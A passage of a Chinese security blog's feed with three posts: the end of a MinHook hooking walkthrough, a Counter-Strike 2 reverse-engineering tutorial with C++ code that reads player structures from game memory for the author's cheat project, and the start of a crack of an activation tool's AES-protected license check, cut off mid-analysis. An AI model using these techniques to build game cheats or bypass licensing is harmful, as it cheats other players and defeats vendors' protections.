class="number">0xE9</span>;</span><br><span class="line">    pJmp-&gt;operand = (UINT32)((LPBYTE)pHook-&gt;pDetour - (pPatchTarget + <span class="built_in">sizeof</span>(JMP_REL)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pHook-&gt;patchAbove)</span><br><span class="line">    &#123;</span><br><span class="line">        PJMP_REL_SHORT pShortJmp = (PJMP_REL_SHORT)pHook-&gt;pTarget;</span><br><span class="line">        pShortJmp-&gt;opcode = <span class="number">0xEB</span>;</span><br><span class="line">        pShortJmp-&gt;operand = (UINT8)(<span class="number">0</span> - (<span class="built_in">sizeof</span>(JMP_REL_SHORT) + <span class="built_in">sizeof</span>(JMP_REL)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先确保有足够权限，然后转为<code>PJMP_REL</code>类型的结构体，通过该结构体修改位对应的<code>jmp</code>跳转</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fecdbf44839af6ff24e2c61e4aabea63.png" alt="image-20240724184129018" /></p><p>第一次jmp后的地址还有一个jmp到指针，这里的指令就是<code>MH_CreateHook</code>时创造出来的</p><p>后续的就是取消hook和释放一些全局变量，取消hook用到的是<code>EnableHook</code>，参数为false，因为两个都需要修改函数的汇编指令码。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;世界上果然没有魔法，到最后发现都是魔术&lt;/p&gt;
&lt;p&gt;解读的项目地址：&lt;a href=&quot;https://github.com/TsudaKageyu/minhook&quot;&gt;https://github.com/TsudaKageyu/minhook&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw&quot;&gt;https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="MinHook" scheme="https://joe1sn.eu.org/tags/MinHook/"/>
    
  </entry>
  
  <entry>
    <title>【破解】CS2人物实体逆向</title>
    <link href="https://joe1sn.eu.org/2024/06/01/crackme-cs2-entity-controller/"/>
    <id>https://joe1sn.eu.org/2024/06/01/crackme-cs2-entity-controller/</id>
    <published>2024-06-01T03:07:53.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址</p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><p>这篇文章发布的时候，关于更多CS2-cheats的代码已经在Github仓库中发布，你可以在下面的链接找到更多CS2的外挂功能</p><p><a href="https://github.com/Joe1sn/ExtCheats">https://github.com/Joe1sn/ExtCheats</a></p><h1 id="游戏环境"><a class="markdownIt-Anchor" href="#游戏环境"></a> 游戏环境</h1><p>Steam上启动的CS2国际服，在设置中加上<code>-insecure</code>参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/87cee640b773cf05f245d8edc362b4c5.png" alt="image-20240520124758128" /></p><p>在游戏中启用控制台，然后 ` 就可以输入命令了</p><p>CS2可以使用<code>CFG</code>文件进行快速的加载，这里我用了一段cfg脚本来进行编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sv_cheats 1</span><br><span class="line">mp_roundtime 60</span><br><span class="line">mp_roundtime_defuse 60</span><br><span class="line">mp_warmup_end</span><br><span class="line">mp_freezetime 0</span><br><span class="line">mp_maxrounds 30</span><br><span class="line">mp_buytime 99999</span><br><span class="line">bot_stop 1</span><br><span class="line">bot_dont_shoot 1</span><br><span class="line">mp_respawn_on_death_t 1</span><br><span class="line">mp_respawn_on_death_ct 1</span><br><span class="line">mp_restartgame  1</span><br></pre></td></tr></table></figure><p>你可以在<code>steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\cfg</code>中防止该文件，然后再游戏中使用<code>exec &lt;不含后缀的文件名&gt;</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9ef8f9ceaa881fe581b12a0943f62ec6.png" alt="image-20240520125021129" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c48e395f66ac9eef3929d6c10c853dfe.png" alt="image-20240520125058628" /></p><p>为了方便调试，可以把屏幕大小改为<code>1280x600</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/74ba85dd992ea54cd1a79ae8b75b70db.png" alt="image-20240520125243904" /></p><h1 id="playerpawn"><a class="markdownIt-Anchor" href="#playerpawn"></a> PlayerPawn</h1><h2 id="简单的ce使用"><a class="markdownIt-Anchor" href="#简单的ce使用"></a> 简单的CE使用</h2><p>首先使用准确值找到HP值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a66b6ebaa34b9bad4a99816bcc458eed.png" alt="image-20240520125402361" /></p><p>在游戏中可以使用<code>hurtme xx</code>来对自身角色造成伤害</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e502eb8f0026136056413c3efe07fb46.png" alt="image-20240520125441150" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dbb9d3396efa8c05038998404b55ab39.png" alt="image-20240520125456873" /></p><p>这样就找到了几个类似的值，这里有几个要点</p><ul><li>由于在真实游戏中我们能控制的只有客户端，没有服务端程序，CS的客户端位于<code>client.dll</code>中，所以我们需要对其进行分析，而且地址最好和该dll相关</li><li>cs2使用了<code>Valve</code>研发的<code>source2</code>引擎，所以我们可以利用相关开源信息进行查找，比如有人做了cs2偏移的仓库：<a href="https://github.com/a2x/cs2-dumper">https://github.com/a2x/cs2-dumper</a> 。</li></ul><p>接着找出有哪些地址访问了这些地址，这里有一个取巧的方法，利用上面的偏移，比如HP的全称是<code>Health Point</code>，那么变量的命名就可能和<code>heal</code>相关，在上面推荐的仓库就可以找到</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/174c8f04224146efafe2c907f72e9e54.png" alt="image-20240520130140134" /></p><p>那么对上面的内存找访问</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/68f0004d76769d803818a7b64a5f1d34.png" alt="image-20240520130240365" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/03d02173e2ae2bd2f2db97c9dac4c594.png" alt="image-20240520130346862" /></p><p>添加该<code>RCX</code>的值，在 浏览相关内存-&gt;工具-&gt;解析结构体中</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2de4194f57d7071632841ab260988543.png" alt="image-20240520130516581" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/97245ce6127ba458b893e37ef8cfbf64.png" alt="image-20240520130529294" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b500fc73d0ce31fa297cc203e886c516.png" alt="image-20240520130615406" /></p><p>我们发现了一个为<code>C_CSPlayerPawn</code>的结构体，接着我们看访问的代码，有两段</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/55f1ccc37d28a2d4bf986d8910560504.png" alt="image-20240520140501547" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bd1647266add8cdbbae304f9ffa61e8d.png" alt="image-20240520140630234" /></p><p>那我们就打开<code>client.dll</code>，分析下这段代码</p><p>文件位于<code>steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\bin\win64</code></p><p>第一段可能为虚函数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/49225f9ea8e9b7f3a453da47219eb08b.png" alt="image-20240520140659150" /></p><p>第二段位于另外一个函数中，我们主要看<code>rsi</code>怎么取到的值，结果发现是这个函数的参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7902c6029b14d53a3aa577441a5d56f9.png" alt="image-20240520140754947" /></p><p>多看看交叉引用发现引用太复杂，随后放弃</p><h1 id="playercontroller"><a class="markdownIt-Anchor" href="#playercontroller"></a> PlayerController</h1><h2 id="从全局变量找到controller"><a class="markdownIt-Anchor" href="#从全局变量找到controller"></a> 从全局变量找到Controller</h2><p>继续按照上一面的找搜索到的HP的一堆地址的访问地址，发现</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/87a2c365f46f6fa73c4065c0032f9edf.png" alt="image-20240520135821227" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2bebd506ba9d123ef30f43eebdda5d90.png" alt="image-20240520135923299" /></p><p>同样的方法我们找到这段代码，然后在IDA中分析</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a1332097022cc49cae2006c9293eaab2.png" alt="image-20240520131122904" /></p><p>IDA中的基地址从<code>0x180000000</code>开始，加上偏移<code>521BB0</code>就找到了这段代码，然后对该函数的引用分析</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5ceac3df098aba05becacac0b2ff67a1.png" alt="image-20240520131226822" /></p><p>发现普遍存在这几个函数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7342cf49a6af2b4dc0a095fe26d19ab8.png" alt="image-20240520131345205" /></p><p>我们先分析下他是这么找到<code>v12</code>的，首先在<code>sub_180697FA0</code>传入了一个<code>v10</code></p><p>先分析<code>sub_180697FA0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_180697FA0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !off_18172EEE0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt;= *(off_18172EEE0 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  v1 = sub_18060A050(qword_18191C5B8, (a1 + <span class="number">1</span>));</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  v3 = (*(*v1 + <span class="number">0x480</span>i64))(v1);</span><br><span class="line">  v4 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在全局变量<code>qword_18191C5B8</code>，在CE中分析一下</p><p>分析其中的<code>sub_18060A050</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18060A050</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x7FFE</span></span><br><span class="line">    &amp;&amp; (a2 &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">0x3F</span></span><br><span class="line">    &amp;&amp; (v2 = *(a1 + <span class="number">8</span>i64 * (a2 &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>)) != <span class="number">0</span></span><br><span class="line">    &amp;&amp; (v3 = (<span class="number">120</span>i64 * (a2 &amp; <span class="number">0x1FF</span>) + v2)) != <span class="number">0</span>i64</span><br><span class="line">    &amp;&amp; (v3[<span class="number">4</span>] &amp; <span class="number">0x7FFF</span>) == a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>a1</code>为全局变量</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e57d21be29f73db9f074afa0d74fbc52.png" alt="image-20240520131727224" /></p><p><code>a2</code>暂时未知，不过我们可以根据<code>fastcall</code>的传参顺序（ rcx,rdx,r8,r9）或者汇编来看<code>a2</code>传递的是什么参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1e80da8df9ed8dc030ec2e1354cdca80.png" alt="image-20240520132002915" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/618a96bb01c4e8e319836b87c64bd864.png" alt="image-20240520132204382" /></p><p>编写python算法模拟一下，但是条件中内存有指针，那没有两种思路</p><ul><li>利用调试器取值</li><li>直接都程序内存</li></ul><p>这里用第一种，先不管最后一个条件，计算得到<code>v2 = 0000019CA3550808 </code></p><p>然后算出<code>v3 = 0x7ffab466e718</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub_18060A050</span>():</span><br><span class="line">    a1 = <span class="number">0x000019CA3AD1800</span></span><br><span class="line">    a2 = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a1 + <span class="number">8</span> * (a2 &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>))</span><br><span class="line">    v2 = <span class="number">0x000019CA3550808</span></span><br><span class="line">    v3 = <span class="number">120</span> * (a2 &amp; <span class="number">0x1FF</span>) + v2</span><br><span class="line">    <span class="keyword">if</span> (a2 &lt;= <span class="number">0x7FFE</span> </span><br><span class="line">        <span class="keyword">and</span> (a2 &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">0x3F</span> </span><br><span class="line">        <span class="keyword">and</span> v2 != <span class="number">0</span> </span><br><span class="line">        <span class="keyword">and</span> v3 != <span class="number">0</span> </span><br><span class="line">        <span class="comment"># and (v3[4] &amp; 0x7FFF) == a2 </span></span><br><span class="line">        ):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(v3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sub_18060A050()</span><br></pre></td></tr></table></figure><p>用CE看一下<code>*v3</code>这个指针的值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/70603ecd33c5dd5aff45e123cf5ac730.png" alt="image-20240520134938594" /></p><p>那么返回的就是<code>00007FFAB4652500</code>，用CE发现是一个叫做<code>CCSPlayerController</code>的数据结构</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/148ea562cc30fcec49e4f2e877ff07a5.png" alt="image-20240520135116592" /></p><p>看下github上的偏移表</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/821a5581345960a5be6fd1469edc1d23.png" alt="image-20240520135214649" /></p><p>发现有几处关键信息：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c7427d9bdc9c0d6f6717db68fb4e7161.png" alt="image-20240520135330110" /></p><p>这样就可以通过<code>client.dll + 191C5B8</code>加上下标，通过刚才的函数，找到了CCSPlayerController开始的地址</p><h2 id="controller到pawn"><a class="markdownIt-Anchor" href="#controller到pawn"></a> Controller到Pawn</h2><p>我们继续逆向，根据<code>Controller+0x7E4</code>为<code>m_hPlayerPawn</code>，就用CE看看这个地址有无读写，在观察下汇编发现</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0264c4bacfba409a1d39debe1ff21a2a.png" alt="image-20240520141741112" /></p><p>由于CE捕获到的两段代码十分相近，那么给rax赋值的话rax引用就可能出现，搜索对<code>[rax]</code>访问找到</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/225431806308549ed652ad3894124e06.png" alt="image-20240520142242702" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    v11 = *a4;                                  <span class="comment">// //////////////</span></span><br><span class="line">    <span class="keyword">if</span> ( *a4 != <span class="number">-1</span></span><br><span class="line">      &amp;&amp; qword_181819538</span><br><span class="line">      &amp;&amp; v11 != <span class="number">-2</span></span><br><span class="line">      &amp;&amp; (v12 = *(qword_181819538 + <span class="number">8</span> * ((v11 &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>))) != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (v13 = (v12 + <span class="number">120</span>i64 * (v11 &amp; <span class="number">0x1FF</span>))) != <span class="number">0</span>i64</span><br><span class="line">      &amp;&amp; *(v13 + <span class="number">4</span>) == v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = *v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 != v14 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v5;</span><br><span class="line">    ++a4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= a5 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>v11</code>就是我捕获到的<code>mPawn</code>值，这里再次出现了全局变量<code>client.dll+1819538</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ff24327da45a69871a68d3633cbad5db.png" alt="image-20240520142752026" /></p><p>同之前编写脚本计算地址，然后再对照，这里就不再赘述过程了。</p><p>得到从<code>CCSPlayerController.mPawn</code>找到对应<code>CSPlayerPawn</code>的方法，这段代码在项目的<code>Cheats</code>的<code>Player</code>类中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Player::GetPawn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DWORD m_hPlayerPawn = <span class="built_in">GetProcessMem</span>(hProcess, <span class="keyword">this</span>-&gt;PlayerControllerAddr, <span class="number">2</span>, <span class="number">0</span>, CSPlayerController::m_hPlayerPawn);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;ClientDLLBase == <span class="number">0</span> || <span class="keyword">this</span>-&gt;hProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 entity_list = <span class="built_in">GetProcessMem</span>(hProcess, <span class="keyword">this</span>-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!entity_list)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 list_entry = <span class="built_in">GetProcessMem</span>(hProcess, entity_list + (<span class="number">8</span> * (<span class="keyword">this</span>-&gt;Index &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>) + <span class="number">0x10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!list_entry)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 playerPawn = m_hPlayerPawn;</span><br><span class="line"><span class="keyword">if</span> (!playerPawn)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 list_entry2 = <span class="built_in">GetProcessMem</span>(hProcess, entity_list + <span class="number">8</span> * ((m_hPlayerPawn &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>) + <span class="number">0x10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!list_entry2)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;PlayerPawnAddr = <span class="built_in">GetProcessMem</span>(hProcess, list_entry2 + ClientDLL::C_CSPlayerController_Gap * (m_hPlayerPawn &amp; <span class="number">0x1FF</span>), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="controller的数组"><a class="markdownIt-Anchor" href="#controller的数组"></a> Controller的数组</h1><p>到这里算是总结了吧。之前从全局变量找到Controller，有许多没用的比较和逻辑运算，这些是为了对其和限制大小</p><p>找到Controller的就可变为，改代码位于项目的<code>Cheats.cpp</code>中，在<code>Cheats</code>的构造函数中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 ListOffsetA = <span class="built_in">GetProcessMem</span>(<span class="keyword">this</span>-&gt;hProcess, <span class="keyword">this</span>-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">DWORD64 v2 = <span class="built_in">GetProcessMem</span>(<span class="keyword">this</span>-&gt;hProcess, ListOffsetA + <span class="number">8</span> * (<span class="number">1</span> &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>-&gt;ControllerBase = v2 + ClientDLL::C_CSPlayerController_Gap;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/512e6a3c3dee6ba36bfd9202df80173b.png" alt="image-20240520143956409" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="crack" scheme="https://joe1sn.eu.org/tags/crack/"/>
    
    <category term="cheats" scheme="https://joe1sn.eu.org/tags/cheats/"/>
    
  </entry>
  
  <entry>
    <title>【破解】一次无害的Coploit激活工具破解</title>
    <link href="https://joe1sn.eu.org/2024/03/28/crackme-coploit/"/>
    <id>https://joe1sn.eu.org/2024/03/28/crackme-coploit/</id>
    <published>2024-03-28T06:18:41.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>难度：⭐</p><p>- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-</p><span id="more"></span><p>难度一星，一颗给go，一颗给密码学，减一颗给简单的认证过程</p><h1 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h1><p>首先是来源</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/629a93de1f16c97ddc782fa332ec2e2e.png" alt="image-20240328142334526" style="zoom:50%;" /><p>下载Windows版看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c89f58cc8d4e57a7febbb3b28a9abe93.png" alt="image-20240328142559130" /></p><p>哦？golang打包的，看看版本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; go version .\authTool.exe</span><br><span class="line">.\authTool.exe: go1.<span class="number">21.0</span></span><br></pre></td></tr></table></figure><p>有点难搞啊，有无Go是无符号的，IDA打开看也是一坨</p><h1 id="粗略动态"><a class="markdownIt-Anchor" href="#粗略动态"></a> 粗略动态</h1><p>这个阶段就是看网络活动，文件操作等等，先打开<code>WireShark</code>和<code>Procmon64</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/31e2c85ca1f654ce3c318522defe02c1.png" alt="image-20240328142838195" /></p><p>然后打开软件跑一下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/be06388ed1da5f3f6edf21e8fe0a4b11.png" alt="image-20240328143029707" /></p><p>这个时候ProcessMonitor已经有了，凭经验来说这里只有网络连接有点价值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/65f90e11e593ac438eaaf16dcae07212.png" alt="image-20240328143233355" /></p><p>两个IP：<code>43.x.x.x</code>（记为ipA）和<code>149.x.x.x</code>（记为ipB），按照先后顺序看</p><p>在wireshark中<code>ip.addr == 43.x.x.x</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/20358a76784ee006c61ced9e1cc126e0.png" alt="image-20240328143548755" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f05d636bb0c29798546351a070ffd061.png" alt="image-20240328143744161" /></p><p>在wireshark中<code>ip.addr == 149.x.x.x</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3a3d09d1f2075bd3a291766be88f7b9f.png" alt="image-20240328144255295" /></p><p>两段都是密文，一眼base64，而且解码完成过后也是乱码，接下来回到你想本身</p><h1 id="动静结合"><a class="markdownIt-Anchor" href="#动静结合"></a> 动静结合</h1><p>根据运行时候的字符串，用golang写过网络请求的小伙伴都知道，网络请求部分是在<code>net</code>库中，立刻在<code>main_main</code>中找到相关</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3503ac001cc8b3e7579f161d9a8b2604.png" alt="image-20240328145108076" /></p><p>有时间的还在静态跟流程，心急的已经开始用ida动调了</p><h2 id="43xxx"><a class="markdownIt-Anchor" href="#43xxx"></a> 43.x.x.x</h2><p>写过golang的都知道，获得发送完请求的结果需要使用一个<code>ReadAll</code>之类的东西</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7cb42a1992de2870953ab1af02b7daba.png" alt="image-20240328145645886" /></p><p>看看下面的AES解密</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/28493cae840676bc3cca1bd586f440cd.png" alt="image-20240328145713758" /></p><p>发现有个相关值<code>1234567890123456</code>，但是CBC加密方式的话不知道这个是<code>key</code>还是<code>iv</code>，动态看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e1dd0cb4f3c84a66d33b80062eda7e9e.png" alt="image-20240328145840300" /></p><p>这里<code>slicebytetostring</code>刚好返回，根据汇编的传参，说明接收到的内容可能在<code>RAX</code>寄存器里面</p><p><img 